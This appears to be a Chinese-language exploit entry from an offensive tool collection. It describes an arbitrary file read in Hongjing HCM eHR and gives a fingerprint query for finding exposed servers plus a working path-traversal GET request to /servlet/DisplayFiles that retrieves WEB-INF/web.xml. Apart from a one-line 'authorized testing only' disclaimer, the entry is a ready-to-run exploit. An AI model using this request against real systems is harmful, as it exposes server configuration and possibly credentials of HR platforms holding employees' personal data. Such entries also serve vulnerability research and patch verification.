---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 宏景HCM DisplayFiles 任意文件读取漏洞

## 漏洞描述

宏景HCM `/templates/attestation/../../servlet/DisplayFiles` 接口存在目录遍历任意文件读取漏洞，`filename` 参数可穿越读取服务器文件。

## 影响版本

```
宏景HCM eHR
```

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

```
GET /templates/attestation/../../servlet/DisplayFiles?filename=../../webapps/ROOT/WEB-INF/web.xml HTTP/1.1
```

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
